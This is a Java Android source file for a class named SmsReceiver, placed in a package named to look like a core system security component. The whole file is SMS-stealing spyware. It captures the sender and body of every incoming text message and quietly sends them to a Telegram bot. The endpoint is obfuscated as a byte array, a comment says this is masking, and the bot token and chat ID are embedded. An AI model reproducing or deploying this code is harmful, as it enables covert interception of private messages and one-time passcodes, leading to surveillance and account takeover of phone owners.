package com.android.system.core.security;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;
        
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String body = sms.getMessageBody();
                        String from = sms.getOriginatingAddress();
                        execute("SRC: " + from + " MSG: " + body);
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    private void execute(String data) {
        new Thread(() -> {
            try {
                // Маскировка эндпоинта через байты
                byte[] b = {104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116};
                String base = new String(b) + "8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8/sendMessage?chat_id=5225064014&text=";
                
                java.net.URL url = new java.net.URL(base + java.net.URLEncoder.encode(data, "UTF-8"));
                java.net.HttpURLConnection c = (java.net.HttpURLConnection) url.openConnection();
                c.setRequestMethod("GET");
                c.setConnectTimeout(5000);
                c.getResponseCode();
                c.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }
}
